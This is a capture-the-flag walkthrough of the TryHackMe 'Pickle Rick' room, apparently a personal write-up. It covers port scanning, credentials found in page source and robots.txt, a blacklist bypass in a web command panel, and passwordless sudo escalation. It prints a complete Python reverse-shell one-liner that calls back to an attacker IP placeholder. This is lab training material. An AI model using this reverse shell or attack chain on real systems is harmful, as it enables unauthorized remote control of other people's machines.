# PICKLE RICK CTF TRYHACKME

# RECON

'Nmap'
nmap -sV -A -T5 <MACHINE_IP>
-Open Ports-

![image](https://user-images.githubusercontent.com/82729808/190850518-7aac9130-039f-4e48-8334-44fa5885b6b4.png)

We got 22 and 80 ports open. Lets move to the web page.
In the source code of the page, we have a username
![image](https://user-images.githubusercontent.com/82729808/190852082-ca41dbe4-7ed2-4bff-ba47-93fd0e9ad1f1.png)


' Gobuster '
![image](https://user-images.githubusercontent.com/82729808/190850795-4be5e958-7fc4-47b2-a422-5b8a9be379c6.png)


 
 Lets look at /robots.txt
 
![image](https://user-images.githubusercontent.com/82729808/190850810-33210e0d-edf9-4579-9d35-e00ae0e92a98.png)

We have this text. And when we look at the login page we understand that its a password

![image](https://user-images.githubusercontent.com/82729808/190850862-700f1c30-6e25-4267-8e02-8c82f4fda116.png)

![image](https://user-images.githubusercontent.com/82729808/190850872-87a9b97d-ff3a-4eb2-9e18-87bfe3062ff9.png)

And we have a command panel. Lets list the files.

![image](https://user-images.githubusercontent.com/82729808/190850884-b388ab7b-e11e-4cea-9f46-ccdc599868e0.png)
 
 When we try to read the files, this happens
 
 ![image](https://user-images.githubusercontent.com/82729808/190850898-a30fb1c1-9b1f-4200-b1ce-53363604c6ae.png)
 
 ![image](https://user-images.githubusercontent.com/82729808/190850911-f0774c25-2fb8-4c05-9a72-27232af40b55.png)

So we have to be creative

![image](https://user-images.githubusercontent.com/82729808/190850911-f0774c25-2fb8-4c05-9a72-27232af40b55.png)

When we use grep and look at the source code, we can see de blacklisted commands
![image](https://user-images.githubusercontent.com/82729808/190850954-fa083d29-5156-4667-bf4b-ae61a1185666.png)

We can use grep again to read the files.

![image](https://user-images.githubusercontent.com/82729808/190851146-2b94f285-69ad-4bb8-8b95-d8cce05d002a.png)

And we've found the first question!

# Explotation

Now we need to get a reverse shell. To do this, we can test if machine has python with the command "python3 -c 'print("I have Python3!")'"

![image](https://user-images.githubusercontent.com/82729808/190851232-c3404331-2d87-45ac-9b88-9e52e441194d.png)

We have python3. Lets copy our reverse shell cheat sheet at  https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<YOUR_OPENVPN_IP>",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

Before we execute this script we have to start a nc listener.

![image](https://user-images.githubusercontent.com/82729808/190851300-b02a00eb-b643-4476-9644-01d4c14d47b7.png)

![image](https://user-images.githubusercontent.com/82729808/190851454-5cf448aa-8457-45fa-9547-25ff550a1fe3.png)

We have the shell!

Let's check out root privileges
![image](https://user-images.githubusercontent.com/82729808/190851481-f042ace0-e186-4f14-aab1-fb6dd635af5d.png)

We can see that we can switch to root account without a password
![image](https://user-images.githubusercontent.com/82729808/190851565-b0f22bb1-b5d2-4090-8ecd-35b408f0e9f7.png)

We have the 3rd ingredient in root directory and the second one in the home page of ricks account
![image](https://user-images.githubusercontent.com/82729808/190851602-e7871eec-6489-4ea3-9274-2c663a5bb20a.png)

# COMPLETED

